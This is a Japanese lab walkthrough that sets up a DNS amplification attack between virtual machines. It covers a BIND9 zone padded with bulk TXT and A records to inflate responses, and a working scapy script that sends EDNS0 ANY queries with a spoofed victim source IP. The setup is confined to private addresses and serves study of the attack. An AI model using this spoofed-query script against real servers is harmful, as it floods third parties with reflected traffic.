ホストOS: Linux

仮想化管理: Virtual Machine Manager（libvirt + QEMU/KVM）

Virtul Machine Manager を使用します。

以下のようにIPアドレスをそれぞれのコンピュターに割り当てる

| 仮想マシン名 | IPアドレス | 用途 |
| --- | --- | --- |
| attacker | すでに割り当てられているものを使う(今回は 192.168.11.25) | scapy による ANY＋EDNS0 クエリ をする |
| victim | 192.168.11.100 | 被害者（偽装される） |
| dns-server | 192.168.11.53 | BIND9でDNSサーバーとして振る舞う。大量のTXT/Aを返す。  |

**２つのゲストOSは仮想ブリッジ `br0` で接続する。**

br0は下のコマンドで作成する。

```bash
sudo ip link add name br0 type bridge
sudo ip link set dev br0 up
sudo ip link set dev enp3s0 master br0  # enp3s0が物理NIC
```

Virtual Machine Manager側でゲストOSがbr0を使用するようにする。

DNSサーバーのシステムのインストールを行います。

```bash
sudo apt install bind9
sudo systemctl start named
```

そしてDNSサーバー側でドメイン takkesan.com に対するゾーンを追加し、大量のレコードが返るようにします。

/etc/bind/db.takkesan.com

```bash
$TTL    604800
@       IN      SOA     ns1.takkesan.com. admin.takkesan.com. (
                          2024052005 ; Serial
                          604800     ; Refresh
                          86400      ; Retry
                          2419200    ; Expire
                          604800 )   ; Negative Cache TTL
;

@       IN      NS      ns1.takkesan.com.
@       IN      A       192.168.11.53
ns1     IN      A       192.168.11.53
www     IN      A       192.168.11.53
mail    IN      A       192.168.11.53
@       IN      MX 10   mail.takkesan.com.

;
@ IN TXT "It was at dusk on a certain day. A lone servant was waiting for the rain to stop under the Rashomon gate."
@ IN TXT "Under the wide gate, there was no one except this man. Only a single cricket rested on a large pillar,"
@ IN TXT "partially stripped of red lacquer. Considering that Rashomon stood on Suzaku Avenue,"
@ IN TXT "there should have been two or three more people, wearing straw hats or soft eboshi,"
@ IN TXT "also waiting for the rain to stop. Yet, there was no one else but this man."
@ IN TXT "The reason was that, in the past two or three years, Kyoto had suffered from a series of disasters earthquakes, whirlwinds,"
@ IN TXT "fires, and famines. As a result, the decline of the city was beyond description. According to old records,"
@ IN TXT "people smashed Buddhist statues and altar fittings, stripping off their red lacquer and gold or silver leaf,"
@ IN TXT "then piled up the wooden remains on the roadside and sold them as firewood. With that being the state of the capital,"

host1    IN      A       192.0.2.0
host2    IN      A       192.0.2.1
host3    IN      A       192.0.2.2
host4    IN      A       192.0.2.3
host5    IN      A       192.0.2.4
host6    IN      A       192.0.2.5
host7    IN      A       192.0.2.6
host8    IN      A       192.0.2.7
```

/etc/bind/named.conf.local

```bash
zone "takkesan.com" {
    type master;
    file "/etc/bind/db.takkesan.com";
};
```

被害者側でポート５３番を一応開けておきます。

```bash
sudo ufw allow 53/udp
```

攻撃者側でWiresharkを起動してbr0を選択します。

入力フィールドにdnsと入力してDNS関連の通信のみを表示するようにします。

攻撃者側で下記のスクリプトをrootで実行します。

```python
from scapy.all import *
import random
import time

def send_spoofed_dns_any_edns0(victim_ip, dns_server_ip, qname, count=5, interval=1.0):
    print(f"[+] Sending {count} spoofed DNS ANY queries with EDNS0 for '{qname}' from {victim_ip} to {dns_server_ip}")

    for i in range(count):
        transaction_id = random.randint(1, 65535) 
        sport=53
        # IP + UDPヘッダ
        ip = IP(src=victim_ip, dst=dns_server_ip)
        udp = UDP(sport=sport, dport=53)

        # DNSクエリ + EDNS0（OPT）レコード付き
        dns = DNS(
            id=transaction_id,
            rd=1,
            qd=DNSQR(qname=qname, qtype=255),  # qtype=255 → ANY
            ar=DNSRROPT(rclass=4096, rdlen=0)
        )

        pkt = ip / udp / dns

        print(f"[*] Sending packet {i+1}/{count} (TXID=0x{transaction_id:04x}, SPORT={sport})")
        send(pkt, verbose=0)
        time.sleep(interval)

# ====== 実行パラメータ ======
victim_ip = "192.168.11.100"       # 偽装された送信元IP（被害者）
dns_server_ip = "192.168.11.53"    # DNSサーバIP（攻撃対象）
domain = "takkesan.com"            # 問い合わせ対象ドメイン
send_count = 5                     # クエリ送信回数
send_interval = 0.5                # 送信間隔（秒）

# ====== 実行 ======
send_spoofed_dns_any_edns0(victim_ip, dns_server_ip, domain, count=send_count, interval=send_interval)
```